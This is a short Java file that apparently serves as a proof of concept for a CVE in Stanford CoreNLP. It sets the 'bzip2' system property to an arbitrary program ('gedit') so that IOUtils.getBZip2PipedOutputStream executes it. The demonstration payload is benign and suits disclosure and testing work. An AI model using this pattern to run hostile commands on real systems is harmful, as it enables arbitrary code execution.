package cve.example;
import edu.stanford.nlp.io.IOUtils;
public class Main {
    public static void main(String[] args) {
        System.setProperty("bzip2", "gedit");
        try {
            IOUtils.getBZip2PipedOutputStream("Main.java");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}